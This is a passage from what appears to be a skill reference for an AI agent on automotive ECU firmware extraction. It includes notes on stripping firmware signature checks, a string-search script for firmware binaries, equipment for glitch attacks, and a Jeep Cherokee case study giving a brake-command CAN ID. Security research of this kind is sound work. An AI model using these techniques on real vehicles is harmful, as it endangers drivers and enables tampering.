# 5. Re-sign with a self-generated key (if you have the OEM's private key)
#    Or strip the signature check entirely (the patched firmware will boot without verification)
#    Write the patched firmware via 0x34/0x36/0x37

# Note: many modern ECUs have an HSM that performs signature verification in hardware.
# Patching the application code does not bypass the HSM. You need to compromise the
# HSM separately (see hardware-security skill).
```

```python
#!/usr/bin/env python3
# analyze_signature.py — extract signature-related strings from firmware
import re, sys

with open('ecu_firmware.bin', 'rb') as f:
    data = f.read()

# Search for crypto-related strings
patterns = [
    rb'RSA[-_ ]?(?:PKCS1|PSS|2048|4096|SHA256)',
    rb'ECDSA[-_ ]?(?:P256|P384|SHA256)',
    rb'SHA[-_ ]?(?:1|256|384|512)',
    rb'AES[-_ ]?(?:128|256|GCM|CBC)',
    rb'HMAC[-_ ]?(?:SHA256|SHA1)',
    rb'verify[_ ]?signature',
    rb'invalid[_ ]?signature',
    rb'certificate[_ ]?chain',
    rb'x[_ ]?509',
    rb'DER[_ ]?encoded',
    rb'mbedTLS',
    rb'OpenSSL',
    rb'BoringSSL',
    rb'TinyCrypt',
]

for pat in patterns:
    matches = list(re.finditer(pat, data, re.IGNORECASE))
    for m in matches:
        # Show surrounding context (32 bytes before and after)
        start = max(0, m.start() - 32)
        end = min(len(data), m.end() + 64)
        context = data[start:end]
        # Show printable chars only
        printable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in context)
        offset = m.start()
        print(f"0x{offset:08X}: {printable}")
```

---

## Lab Setup for Firmware Extraction

### Bench ECU Power and CAN

```
┌──────────────┐         ┌───────────────┐         ┌─────────────┐
│  Bench PSU   │─────────│   ECU on a    │─────────│  CAN adapter│
│  +12V (5A)   │  Pin 30 │   breakout    │ CAN-H/L │  (USBTin /  │
│  +12V ign    │  Pin 15 │   board       │  Pin 6/ │  PCAN /     │
│  GND         │  Pin 31 │               │  14     │  Kvaser)    │
└──────────────┘         └───────────────┘         └─────────────┘
                                 │
                                 │ JTAG header
                                 │ (TCK, TMS, TDI, TDO, RST, VCC, GND)
                                 │
                         ┌───────┴───────┐
                         │  P&E Micro     │
                         │  Universal     │
                         │  Multilink     │
                         │  (~$1000)      │
                         └───────────────┘
```

### Equipment Tiers

| Tier | Equipment | Cost | Capability |
|------|-----------|------|------------|
| 1 | CH341A SPI programmer + SOIC-8 clip | ~$15 | SPI NOR reads only (small body ECUs) |
| 2 | ST-Link v2 + OpenOCD | ~$15 | SWD/JTAG reads on ARM ECUs (RDP L0/1 only) |
| 3 | RT809F programmer + TSOP-48 socket | ~$200 | NAND/eMMC desoldered reads |
| 4 | P&E Micro Universal Multilink | ~$1000 | Full boot mode on MPC5xxx/MPC57xx |
| 5 | Lauterbach Trace32 | ~$15k | Industry-standard; full trace and flash access |
| 6 | Renesas E2 emulator + Renesas CS+ | ~$500 | RH850 boot mode (with CSI key) |
| 7 | ChipWhisperer Pro | ~$5k | Power analysis / glitch attacks |
| 8 | Xeltek SuperPro 7500 | ~$3k | Universal flash programmer (any package) |

### Salvage ECU Sourcing

| Source | Cost | Notes |
|--------|------|-------|
| Local junkyard | $30-200 | Best value; usually complete with harness |
| eBay "for parts" | $50-300 | Often just needs a connector repair |
| OEM dealer (wholesale) | $200-2000 | New; for proper R&D validation |
| Tier-1 dev board | $500-5000 | Engineering sample; full debug access |

---

## Real-World Case Study: Jeep Cherokee 2015 Firmware Path

The 2015 Jeep Cherokee attack (Miller & Valasek) demonstrates the full chain. The firmware extraction step was not the initial entry — they got in via the cellular modem → IVI → CAN bus pivot. But to identify the brake-command arbitration ID and signal layout, they needed the DBC. They obtained it via:

1. Captured CAN traces from a 2014 Jeep Cherokee (they owned one).
2. Side-channel correlation (depress brake pedal, diff the bus).
3. Cross-reference with leaked Chrysler firmware for the V850 ECUs.
4. Recovery of the seed/key algorithm for the V850 ECUs (some were simple XOR).
5. Used UDS 0x27 + 0x35/0x36 to read firmware from the engine and ABS ECUs directly.

The result: a complete DBC for the powertrain bus, including the brake-command arbitration ID (0x2E3 in their target model) and the signal layout (bytes 4-5 are torque command, byte 6 is enable flag). From there, the injection was a single `cansend`.

Reference: illmatics.com/Remote%20Car%20Hacking.pdf — the technical paper includes the DBC excerpts and the seed/key algorithm for the V850 ECUs.

---

## Tooling Reference

### Open-Source Tools

| Tool | Purpose | URL |
|------|---------|-----|
| python-can | Python CAN library | github.com/hardbyte/python-can |
| python-isotp | ISO-TP transport layer | github.com/pylessard/python-isotp |
| cantools | DBC encode/decode | github.com/cantools/cantools |
| OpenOCD | Open On-Chip Debugger (JTAG/SWD) | openocd.org |
| flashrom | SPI flash read/write | flashrom.org |
| Ghidra | Reverse engineering framework | ghidra-sre.org |
| binwalk | Firmware analysis | github.com/ReFirmLabs/binwalk |
| OpenBLT | Open bootloader | github.com/feaser/openblt |

### Commercial Tools

| Tool | Purpose | Approximate Cost |
|------|---------|-----------------|
| Vector CANoe + CANalyzer | Industry-standard CAN analysis | $20k+ |
| Vector vFlash | ECU flashing tool | $5k+ |
| Lauterbach Trace32 | Debugger for PowerPC, RH850, ARM | $15k+ |
| P&E Micro Universal Multilink | PowerPC boot mode | $1k |
| Renesas E2 emulator | RH850 debugging | $500 |
| Xeltek SuperPro 7500 | Universal flash programmer | $3k |
| ChipWhisperer Pro | Power analysis / glitch | $5k |

### Open DBC Repositories

| Repository | Coverage |
|------------|----------|
| github.com/commaai/opendbc | Tesla, Hyundai, Kia, Honda, Toyota, GM, VW |
| github.com/greentropics/opendbc | Additional makes |
| github.com/EmanuelM5/dbc-files | Custom-compiled DBCs |

---

## References

### Standards

- **ISO 14229-1:2020** — Road vehicles — Unified Diagnostic Services (UDS). The canonical UDS specification.
- **ISO 15765-2:2016** — Road vehicles — Diagnostic communication over CAN (DoCAN) — Part 2: Transport protocol (ISO-TP) and network layer services.
- **ISO 15765-3:2016** — DoCAN — Part 3: Implementation of UDS on CAN.
- **ISO 14230-3:2004** — KWP2000 (K-Line diagnostic, predecessor to UDS on CAN).
- **ISO 13400-1:2019** — DoIP (Diagnostics over IP, for Automotive Ethernet).
- **ISO/SAE 21434:2021** — Road vehicles — Cybersecurity engineering (the SDLC standard).
- **AUTOSAR CP R22-11** — SecOC and Secure Boot specifications.
- **IEEE 802.3bp / 100/1000BASE-T1** — Automotive Ethernet.

### Key Papers and Presentations

- Miller, C. & Valasek, C. (2015). "Remote Exploitation of an Unaltered Passenger Vehicle." DEF CON 23. [illmatics.com/Remote%20Car%20Hacking.pdf](http://illmatics.com/Remote%20Car%20Hacking.pdf). The 2015 Jeep Cherokee kill chain paper.
- Miller, C. & Valasek, C. (2014). "Adventures in Automotive Networks and Control Units." DEF CON 22.
- Checkoway, S. et al. (2011). "Comprehensive Experimental Analyses of Automotive Attack Surfaces." USENIX Security.
- Foster, I. & Koscher, K. (2015). "Exploring Controller Area Networks for Fun and Profit." USENIX ;login:.
- Nie, S., Liu, L., & Yue, Y. (2017). "We Are Breaking the Obfuscation of V850 Firmware." Tencent Keen Lab. The Tesla firmware extraction methodology.
- Tindell, K. (2023). "CAN Injection: Keyless Car Theft." Analysis of the UK CAN injection thefts with technical detail on the underlying firmware exploit.
- Costin, A. & Francillon, A. (2012). "Automotive Security and Obfuscation." Analysis of ECU firmware obfuscation techniques.

### Open-Source Seed/Key Databases

- [github.com/rmundez/SeedNKey](https://github.com/rmundez/SeedNKey) — Community-maintained UDS seed/key implementations.
- [github.com/space928/UDS-Seed-Defeater](https://github.com/space928/UDS-Seed-Defeater) — Tool for analyzing weak seed/key algorithms.
- [opendbc.com](https://opendbc.com) — Comma.ai's open DBC repository.

### Hardware Documentation

- NXP MPC5748G Reference Manual — [nxp.com](https://www.nxp.com). Includes boot mode protocol and JTAG interface.
- Renesas RH850/E2x User's Manual: Hardware — [renesas.com](https://www.renesas.com). Includes CSI secure boot and debug interface.
- ARM CoreSight Architecture Specification — ARM's standard debug interface.
- OpenOCD User's Guide — [openocd.org](https://openocd.org/doc/html/OpenOCD-User-s-Guide.html). The reference for JTAG/SWD on ARM ECUs.

### Industry Forums and Conferences

- **DEF CON Car Hacking Village** — Annual conference; the primary venue for automotive security research.
- **WOOT (Workshop on Offensive Technologies)** — USENIX-affiliated; academic automotive security papers.
- **escar (Embedded Security in Cars)** — Industry conference (Europe, US, Asia).
- **Automotive Cybersecurity Summit (AutoCyber)** — Industry conference, R155/R156 focus.
- **Auto-ISAC Best Practices** — [automotiveisac.com](https://automotiveisac.com). Industry-developed security best practices for OEMs and Tier-1s.

### Skill Cross-References

- `skills/hardware-security/` — Generic JTAG/UART/SWD/glitching/power-analysis techniques.
- `skills/binary-reverse/` — Ghidra/IDA/Binary Ninja usage for ECU firmware analysis.
- `skills/firmware-reverse/` — Binwalk and firmware extraction workflow.
- `skills/scada-ics-security/` — Architectural parallel (deterministic bus, no auth, OT threat model).
